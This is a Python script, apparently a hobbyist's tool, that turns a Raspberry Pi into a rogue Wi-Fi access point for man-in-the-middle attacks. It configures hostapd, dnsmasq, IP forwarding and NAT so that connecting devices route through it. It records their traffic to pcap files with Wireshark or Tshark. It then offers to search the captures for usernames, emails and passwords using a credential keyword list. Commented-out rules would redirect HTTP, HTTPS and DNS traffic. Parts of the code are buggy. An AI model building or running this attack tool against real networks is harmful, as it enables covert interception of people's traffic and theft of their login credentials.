import os
import time

print('MITM rogue access point program for Raspberry Pi 3 B+ '
      '\nCreated by Marius')

sudo = '/usr/bin/sudo'

log_files = '/root/Documents/MITM-logs'


'''def keyboardinterrupt_stop():
    print('\033[1;32m\n(I) Cancelling script\033[1;m')
    os.system('sudo screen -S MITM-Hostapd -X Stuff "^C\n"')

    if capture_traffic == 'w':
        os.system('sudo screen -S MITM-Wireshark -X Stuff "^C\n"')
        os.system('sudo pkill -f wireshark')
        # sniffing_file = 'MITM-Wireshark.pcap'

    if capture_traffic == 't':
        os.system('sudo screen -S MITM-Tshark -X Stuff "^C\n"')
        # sniffing_file = 'MITM-Tshark.pcap'

    print('\033[1;32m(I) Restoring old NetworkManager.conf file if there was any\033[1;m')
    if os.path.isfile('/etc/NetworkManager/NetworkManager.conf.backup'):
        os.system('sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf '
                  '> /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Restoring dnsmasq and hostapd config files\033[1;m')
    if os.path.isfile('/etc/dnsmasq.conf.backup'):
        os.system('sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/dnsmasq.conf > /dev/null 2>&1')

    if os.path.isfile('/etc/hostapd/hostapd.conf.backup'):
        os.system('sudo mv /etc/hostapd/hostapd.conf.backup /etc/hostapd/hostapd.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Restarting the service NetworkManager\033[1;m')
    os.system('sudo service NetworkManager stop')
    os.system('sudo pkill -f dnsmasq')
    os.system('sudo service dnsmasq stop')
    os.system('sudo service hostapd stop')
    print('\033[1;32m(I) Flushing iptable configs\033[1;m')
    os.system('sudo iptables -F')
    os.system('sudo iptables -F -t nat')
    os.system('sudo iptables -X')
    os.system('sudo iptables -t nat -X')
    os.system('sudo ip addr flush dev wlan0')
    print('\033[1;32m(I) MITM has stopped\033[1;m')
    print('\033[1;32m(I) Captured data are stored in the MITM-log directory\033[1;m')

    search_data = input('(?) Would you like to search through the packets sniffed for userdata? ')
    search_data = search_data.lower()
    if search_data == 'y' or '':
        search_word = {'username', 'user', 'name', 'nickname', 'userfield', 'login-name', 'logginn', 'innlogging',
                       'brukernavn', 'epost', 'epostadresse', 'alias', 'brukerkonto', 'email', 'login-id', 'user-name',
                       'userID', 'userid', 'user-id', 'input_USERNAME_IDPORTEN', 'login_name', 'login-name',
                       'login-user', 'login_user', 'account', 'account-name', 'acc-name', 'account-user',
                       'account-name', 'password', 'passwd', 'passphrase', 'pass', 'pwd'}
        os.system('sudo cd ' + log_files)
        frame_contains = "'frame contains "
        for i in search_word:
            os.system('tshark -nr ' + sniffing_file + ' -Y ' + frame_contains + search_word + '-w output.pcap')'''

try:
    update = input('(?) Do you want to update/install programs? y/n: ')
    update = update.lower()
    if update == 'y' or '':
        print('\033[1;32m\n(I) Installing/updating programs\033[1;m')
        os.system('sudo apt -y update && apt -y upgrade && apt -y dist-upgrade')
        os.system('sudo apt install dnsmasq -y')
        os.system('sudo apt install wireshark -y')
        os.system('sudo apt install hostapd -y')
        os.system('sudo apt install screen -y')
        os.system('sudo apt install driftnet -y')

    access_interface = input('\n(?) What is the name of the access point interface? ')
    internet_interface = input('\n(?) What is the name of the internet interface? ')

    print('\033[1;32m\n(I) Creating/editing NetworkManager.conf\033[1;m')
    os.system('sudo service NetworkManager stop')
    if os.path.isfile('/etc/NetworkManager/NetworkManager.conf'):
        print('\033[1;32m(I) Saving NetworkManager.conf as .conf.backup\033[1;m')
        os.system('sudo mv /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup')
    if not os.path.isfile('/etc/NetworkManager/NetworkManager.conf'):
        filewrite = open('/etc/NetworkManager/NetworkManager.conf', 'w')
        filewrite.write('[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:' + access_interface)
        filewrite.close()

    print('\033[1;32m(I) Restarting service and interface\033[1;m')
    os.system('sudo ifconfig ' + access_interface + ' down')
    time.sleep(1)
    os.system('sudo ifconfig ' + access_interface + ' up')

    ssid = input('\n(?) What is the SSID of the network? ')

    wifi_password = input('\n(?) Do you want the network to be password protected? ')
    wifi_password = wifi_password.lower()
    if wifi_password == 'y' or '':
        wifi_password = input('\n(?) Please enter the password (8 letters/numbers): ')
        hostapd_config = ('interface=' + access_interface + '\ndriver=nl80211\nssid=' + ssid + '\nhw_mode=g\nchannel=6'
                          '\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase='
                          + wifi_password + '\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP')
    else:
        hostapd_config = ('interface=' + access_interface + '\ndriver=nl80211\nssid=' + ssid + '\nhw_mode=g\nchannel=6' +
                          '\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0')

    if os.path.isfile('/etc/hostapd/hostapd.conf'):
        print('\033[1;32m\n(I) Saving old hostapd config file as .conf.backup\033[1;m')
        os.system('sudo mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.backup')
    print('\033[1;32m(I) Creating new hostapd config file\033[1;m')
    if not os.path.isfile('/etc/hostapd/hostapd.conf'):
        os.system('sudo touch /etc/hostapd/hostapd.conf')
        filewrite = open('/etc/hostapd/hostapd.conf', 'w')
        filewrite.write(hostapd_config)
        filewrite.close()

    print('\033[1;32m(I) The default network mask is 255.255.255.0\033[1;m')
    ip_address = input('\n(?) What IP address do you want to have on the access point? ')
    print('\033[1;32m\n(I) Configuring access point interface\033[1;m')
    os.system('sudo ifconfig ' + access_interface + ' up ' + ip_address + ' netmask 255.255.255.0')
    print('\033[1;32m(I) Setting up IP tables\033[1;m')
    os.system('sudo iptables -F')
    os.system('sudo iptables -t nat -F')
    os.system('sudo iptables -X')
    os.system('sudo iptables -t nat -X')

    capture_traffic = input('\n(?) Do you want to capture traffic on ' + access_interface + ' with Wireshark, '
                                                                                            'Tshark or not at all?'
                                                                                            '[W/T/N] ')
    capture_traffic = capture_traffic.lower()

    print('\033[1;32m\n(I) Creating directory for logs in /root/Documents/\033[1;m')
    if os.path.isdir('/root/Documents/MITM-logs-old'):
        if True:
            print('\033[1;32m(I) Removing old log directory\033[1;m')
            os.system('sudo rm -r -f /root/Documents/MITM-logs-old')
    if os.path.isdir('/root/Documents/MITM-logs'):
        if True:
            print('\033[1;32m(I) Saving old logs in Documents under MITM-logs-old\033[1;m\n')
            os.system('sudo mv /root/Documents/MITM-logs /root/Documents/MITM-logs-old')
    if not os.path.isdir('/root/Documents/MITM-logs'):
        os.system('sudo mkdir /root/Documents/MITM-logs')

    os.system('sudo iptables -t nat -A POSTROUTING -o ' + internet_interface + ' -j MASQUERADE')
    os.system('sudo iptables -A FORWARD -i ' + access_interface + ' -j ACCEPT')
    # os.system('sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080')
    # os.system('sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53')
    # os.system('sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53')
    # os.system('sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080')

    print('\033[1;32m\n(I) Creating rule to forward IP packets')
    if os.path.isfile('/etc/sysctl.conf'):
        os.system('sudo mv /etc/sysctl.conf /etc/sysctl.conf.backup')
    if not os.path.isfile('/etc/sysctl.conf'):
        filewrite = open('/etc/sysctl.conf', 'w')
        filewrite.write('net.ipv4.ip_forward=1\n'
                        'net.ipv4.conf.all.send_redirects=0')
        filewrite.close()

    print('\033[1;32m(I) Configuring DHCP server\033[1;m')
    if os.path.isfile('/etc/dnsmasq.conf'):
        os.system('sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.backup')
        print('\033[1;32m(I) Creating new DHCP config file\033[1;m')
    if not os.path.isfile('/etc/dnsmasq.conf'):
        filewrite = open('/etc/dnsmasq.conf', 'w')
        filewrite.write('no-resolv'
                        '\ninterface=' + access_interface +
                        '\ndhcp-range=192.168.50.10,192.168.50.50,12h'
                        '\nserver=8.8.8.8\nserver=' + ip_address)
        filewrite.close()

    print('\033[1;32m(I) Restarting DHCP server\033[1;m')
    os.system('sudo /etc/init.d/dnsmasq stop')
    os.system('sudo pkill -f dnsmasq')
    os.system('sudo dnsmasq -C /etc/dnsmasq.conf')

    if capture_traffic == 'w':
        print('\033[1;32m(I) Starting Wireshark\033[1;m')
        os.system('sudo touch ' + log_files + '/MITM-Wireshark.pcap')
        os.system('sudo screen -S MITM-Wireshark -m -d wireshark -i ' + access_interface + ' -k -w ' +
                  log_files + '/MITM-Wireshark.pcap')

    if capture_traffic == 't':
        print('\033[1;32m(I) Starting Tshark\033[1;m')
        os.system('sudo touch ' + log_files + '/MITM-Tshark.pcap')
        os.system('sudo screen -S MITM-Tshark -m -d tshark -i ' + access_interface + ' -w ' + log_files +
                  '/MITM-Tshark.pcap')

    print('\033[1;32m(I) Starting access point on ' + access_interface + '\033[1;m')
    os.system('sudo hostapd /etc/hostapd/hostapd.conf')

    # If the program stops due to an error it will cancel and run the following commands
    '''if KeyboardInterrupt:
        keyboardinterrupt_stop()
        exit()'''

    print('')
    print('\033[1;32m\n\n(I) Something went wrong, cancelling script\033[1;m')
    os.system('sudo screen -S MITM-Hostapd -X Stuff "^C\n"')

    if capture_traffic == 'w':
        os.system('sudo screen -S MITM-Wireshark -X Stuff "^C\n"')
        os.system('sudo pkill -f wireshark')

    if capture_traffic == 't':
        os.system('sudo screen -S MITM-Tshark -X Stuff "^C\n"')

    print('\033[1;32m(I) Restoring old NetworkManager.conf file if there was any\033[1;m')
    if os.path.isfile('/etc/NetworkManager/NetworkManager.conf.backup'):
        os.system('sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf '
                  '> /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Restoring config files\033[1;m')
    if os.path.isfile('/etc/dnsmasq.conf.backup'):
        os.system('sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/dnsmasq.conf > /dev/null 2>&1')

    if os.path.isfile('/etc/hostapd/hostapd.conf.backup'):
        os.system('sudo mv /etc/hostapd/hostapd.conf.backup /etc/hostapd/hostapd.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1')

    if os.path.isfile('/etc/sysctl.conf.backup'):
        os.system('sudo mv /etc/sysctl.conf.backup /etc/sysctl.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/sysctl.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Flushing iptable configs')
    os.system('sudo iptables -F')
    os.system('sudo iptables -F -t nat')
    os.system('sudo iptables -X')
    os.system('sudo iptables -t nat -X')
    os.system('sudo ip addr flush dev wlan0')

    print('\033[1;32m(I) Restarting all services\033[1;m')
    os.system('sudo service NetworkManager stop')
    os.system('sudo pkill -f dnsmasq')
    os.system('sudo service dnsmasq stop')
    os.system('sudo service hostapd stop')
    print('\033[1;32m(I) MITM has stopped\033[1;m')
    time.sleep(2)


except KeyboardInterrupt:
    print('\033[1;32m\n\n(I) Cancelling script\033[1;m')
    os.system('sudo screen -S MITM-Hostapd -X Stuff "^C\n"')

    if capture_traffic == 'w':
        os.system('sudo screen -S MITM-Wireshark -X Stuff "^C\n"')
        os.system('sudo pkill -f wireshark')

    if capture_traffic == 't':
        os.system('sudo screen -S MITM-Tshark -X Stuff "^C\n"')

    print('\033[1;32m(I) Restoring old NetworkManager.conf file if there was any\033[1;m')
    if os.path.isfile('/etc/NetworkManager/NetworkManager.conf.backup'):
        os.system('sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf '
                  '> /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Restoring dnsmasq and hostapd config files\033[1;m')
    if os.path.isfile('/etc/dnsmasq.conf.backup'):
        os.system('sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/dnsmasq.conf > /dev/null 2>&1')

    if os.path.isfile('/etc/hostapd/hostapd.conf.backup'):
        os.system('sudo mv /etc/hostapd/hostapd.conf.backup /etc/hostapd/hostapd.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Restarting the service NetworkManager\033[1;m')
    os.system('sudo service NetworkManager stop')
    os.system('sudo pkill -f dnsmasq')
    os.system('sudo service dnsmasq stop')
    os.system('sudo service hostapd stop')
    print('\033[1;32m(I) Flushing iptable configs\033[1;m')
    os.system('sudo iptables -F')
    os.system('sudo iptables -F -t nat')
    os.system('sudo iptables -X')
    os.system('sudo iptables -t nat -X')
    print('\033[1;32m(I) MITM has stopped\033[1;m')
    print('\033[1;32m(I) Captured data are stored in the MITM-log directory\033[1;m')

    search_data = input('(?) Would you like to search through the packets sniffed for userdata? ')
    search_data = search_data.lower()
    if search_data == 'y' or '':
        search_word = {'username', 'user', 'name', 'nickname', 'userfield', 'login-name', 'logginn', 'innlogging',
                       'brukernavn', 'epost', 'epostadresse', 'alias', 'brukerkonto', 'email', 'login-id', 'user-name',
                       'userID', 'userid', 'user-id', 'input_USERNAME_IDPORTEN', 'login_name', 'login-name',
                       'login-user', 'login_user', 'account', 'account-name', 'acc-name', 'account-user',
                       'account-name', 'password', 'passwd', 'passphrase', 'pass', 'pwd'}
        os.system('sudo cd ' + log_files)
        frame_contains = "'frame contains '"
        os.system('tshark -nr input.pcap -Y ' + frame_contains + search_word + '-w output.pcap')
